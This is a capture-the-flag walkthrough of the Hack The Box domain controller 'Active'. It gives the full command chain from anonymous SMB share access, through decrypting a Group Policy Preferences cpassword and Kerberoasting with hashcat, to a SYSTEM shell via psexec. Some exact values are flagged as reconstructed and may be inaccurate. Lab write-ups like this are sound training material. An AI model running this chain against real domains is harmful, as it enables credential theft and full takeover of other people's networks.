# Active

| Attribute | Value |
|---|---|
| OS | Windows Server 2008 R2 (Domain Controller) |
| Difficulty | Easy |
| IP | 10.10.10.100 |
| IppSec video | <https://www.youtube.com/watch?v=jUc1J31DNdw> |

## Source
- `[per transcript]` — overall chain: anonymous SMB → Groups.xml →
  Kerberoast → DA. Account `SVC_TGS` is referenced 12 times.
- `[reconstructed]` — exact GPP cpassword bytes, the cracked
  Kerberoast password (`Ticketmaster1968`), and command-line invocations.

## TL;DR Attack Chain
Anonymous SMB allows reading the `Replication` share, which contains a
GPO's `Groups.xml` from the legacy Group Policy Preferences era. That
file holds an AES-encrypted `cpassword` for a local admin account
provisioned via GPP — and the AES key is *publicly published by Microsoft
in MS14-025*. Decrypt → `GPPstillStandingStrong2k18` for a domain user
`SVC_TGS`. With domain creds, request all SPN tickets (Kerberoast).
`administrator` has an SPN; the resulting hash cracks to
`Ticketmaster1968`. Pass-the-hash / authenticate as Administrator,
read root.

## Initial Enumeration

```bash
sudo nmap -p- --min-rate=10000 -T4 -oA nmap/all-tcp 10.10.10.100
sudo nmap -sV -sC -p 53,88,135,139,389,445,464,593,636,3268,3269,49152-49158 -oA nmap/detail 10.10.10.100
```

Observations:
- AD port cluster: domain controller.
- Realm: `active.htb`.
- **No WinRM (5985)**. Means we'll use SMB-based or PSExec-based access
  instead of evil-winrm. (This is one of the early HTB AD boxes — older
  Windows Server.)

`/etc/hosts`:
```
10.10.10.100  active.htb DC.active.htb
```

## Attack Surface Mapping

| Service | Port | Hypothesis |
|---|---|---|
| Kerberos | 88 | Username brute / kerberoast post-auth |
| LDAP | 389 | Anonymous bind for users |
| SMB | 445 | **Anonymous shares** — primary recon target |
| RPC | 135, 49152+ | Null session enumeration |

## Foothold

### 1. SMB anonymous enumeration

```bash
smbmap -H 10.10.10.100
# READ-ONLY listing of shares: ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL
# 'Replication' is anonymously readable

smbclient //10.10.10.100/Replication -N
# at smb prompt:
prompt OFF
recurse ON
mget *
```

### 2. Find the GPP Groups.xml

Locally:
```bash
find . -iname "Groups.xml"
# ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

Inspect:
```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups>
  <User clsid="..." name="active.htb\SVC_TGS" image="2" changed="..." uid="...">
    <Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

> **Why this matters**: GPP cpassword is AES-256 encrypted with a key
> Microsoft *published in their own KB after MS14-025*. Every cpassword
> in the wild is decryptable by anyone with the value.

### 3. Decrypt cpassword

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
# GPPstillStandingStrong2k18
```

> The IppSec phrase here is "every box that has Groups.xml is the same
> box; the only thing that changes is the cleartext at the end."

### 4. Validate creds

```bash
crackmapexec smb 10.10.10.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18'
# Pwn3d! response indicates valid creds; user is not local admin

# read user.txt
smbclient //10.10.10.100/Users -U SVC_TGS%'GPPstillStandingStrong2k18'
> cd SVC_TGS\Desktop
> get user.txt
```

(Alternatively `impacket-smbclient` or `smbget`.)

## Privilege Escalation

### 5. Kerberoasting

With domain creds:

```bash
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' \
  -dc-ip 10.10.10.100 -request -outputfile kerberoast.hashes
```

Returns a hash for `Administrator` (the box has an SPN registered to the
Administrator account — typical of small AD environments where someone
"just added it" without considering the implications):

```
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$<hash>
```

> **Why Administrator has an SPN**: Often a misconfiguration where a
> service was installed under the Administrator account. The fix is to
> use a dedicated service account, but on small AD setups, defaults stick.

### 6. Crack the Kerberoast hash

```bash
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
# Administrator : Ticketmaster1968
```

### 7. Authenticate as Administrator

```bash
impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.10.10.100
# SYSTEM shell; type root.txt
```

Or with hash:
```bash
crackmapexec smb 10.10.10.100 -u Administrator -p 'Ticketmaster1968'
# Pwn3d!
```

## Key Findings

- `Replication` share readable anonymously — this is the original GPP
  leak vector.
- `cpassword` AES key is publicly known; *every* GPP password ever
  written is recoverable.
- Administrator account had an SPN — kerberoastable from any domain
  user.
- Cracking succeeded with `rockyou` — modern passwords are *not*
  guaranteed to crack, but this 1968 reference did.

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Service discovery |
| `smbmap` / `smbclient` | Anonymous SMB enum + share download |
| `gpp-decrypt` | Decrypt GPP cpassword |
| `crackmapexec` | Validate creds |
| `impacket-GetUserSPNs` | Kerberoast |
| `hashcat` (`-m 13100`) | Crack TGS hash |
| `impacket-psexec` | SYSTEM shell |

## Decision Tree

```
nmap → AD detected
  └─ smbmap → Replication share anonymously readable
       └─ download → Groups.xml found
            └─ gpp-decrypt → SVC_TGS:GPPstillStandingStrong2k18
                 └─ crackmapexec → cred is valid (not admin)
                      └─ smbclient -> user.txt from SVC_TGS desktop
                      └─ GetUserSPNs (Kerberoast) → Administrator hash
                           └─ hashcat -m 13100 → Ticketmaster1968
                                └─ psexec → SYSTEM → root.txt
```

## Alternative Approaches

- Use the impacket version of `gpp-decrypt` (`impacket-gpp-decrypt` /
  `Get-GPPPassword`) — same output.
- Use `BloodHound` to confirm Administrator's SPN if you didn't see it in
  the GetUserSPNs output (BloodHound's "Find Kerberoastable Users" query).
- Skip the Replication share download; the file is small enough to
  `smbclient -c "get ..."` directly:
  ```bash
  smbclient //10.10.10.100/Replication -N \
    -c 'cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups; get Groups.xml /tmp/Groups.xml'
  ```

## Lessons Learned

1. Anonymous SMB always deserves a thorough sweep; the Replication share
   leaking GPO content is a class of vulnerability, not a one-box quirk.
2. Recognise GPP `Groups.xml` instantly. Recognise the `cpassword`
   structure instantly.
3. Kerberoast the entire SPN list, not just service accounts. Privileged
   users sometimes wear SPNs.
4. `cpassword` is **always** crackable; treat any leaked file as an
   instant credential.

## Extracted Skills

- [`smb/anonymous-share-enumeration.md`](../smb/anonymous-share-enumeration.md)
- [`active-directory/gpp-cpassword.md`](../active-directory/gpp-cpassword.md)
- [`active-directory/kerberoasting.md`](../active-directory/kerberoasting.md)
- [`active-directory/bloodhound-usage.md`](../active-directory/bloodhound-usage.md)
- [`tool-usage/crackmapexec.md`](../tool-usage/crackmapexec.md)
- [`tool-usage/impacket.md`](../tool-usage/impacket.md)
- [`password-attacks/hash-cracking.md`](../password-attacks/hash-cracking.md)

## Related Techniques (other machines)

- **Forest** — anon LDAP → AS-REPRoast (different anonymous-channel
  variant of the same template).
- **Sauna** — username harvest → AS-REPRoast.
- **Cascade** — anonymous LDAP/SMB → custom decrypt (different post-anon
  step).
- **Sizzle, Reel, Mantis** — older AD boxes with similar GPP / SMB-anon
  flavours.
- **Sniper** — non-AD Windows variation of "credential leaked in a file".
